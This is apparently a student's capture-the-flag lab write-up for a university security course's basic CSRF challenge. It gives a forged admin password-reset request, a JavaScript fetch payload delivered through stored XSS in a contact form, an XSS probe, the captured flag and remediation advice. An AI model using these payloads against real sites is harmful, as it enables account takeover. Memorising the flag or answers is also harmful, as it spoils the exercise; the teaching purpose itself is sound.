# Challenge 1 (Basic CSRF)

### 1.

> Quelle fonctionnalité du site, potentiellement vulnérable à une faille CSRF, pourriez-vous exploiter pour voler le compte administrateur ?

The password reset feature.

### 2.

> Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l’administrateur.

```
POST /profile/loic.herman_admin HTTP/1.1
Host: basic.csrf.slh.cyfr.ch
Content-Type: application/x-www-form-urlencoded

password=strongpassword
```

### 3.

> Écrivez une payload javascript qui exécute la requête.

```html
<script>
fetch("/profile/loic.herman_admin", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    "body": "password=strongpassword",
    "method": "POST",
    "mode": "cors"
});
</script>
```

### 4.

> Quelle fonctionnalité du site, potentiellement vulnérable à une faille Stored XSS, pourriez-vous exploiter pour faire exécuter votre payload par l’administrateur ?

The admin contact feature could potentially be vulnerable to stored XSS if the sent HTML is displayed directly to the administrator.

### 5.

> Quel est le flag ? Comment avez-vous pu l’obtenir ?

`7fHF68A8nIUBLD8m`

First, we proved that the contact feature was vulnerable to XSS attacks by sending the payload `<img src onerror="alert(1)" />`.
This indeed proved to us that the content was being executed since the response was delayed (and it might have forced a reboot of the service, oops).

So naturally the next step was to send our payload, which executed properly and after logging out and logging in using our administrator account,
we were able to access the `/admin` page, containing our flag!

### 6.

> Comment corrigeriez-vous la vulnérabilité ?

Obviously, user-generated content should never be simply printed on the page directly. It should have been properly sanitized beforehand,
preventing the admin from mistakenly executing requests. Though a proper CSRF protection should also be put in place, using anti-CSRF tokens.

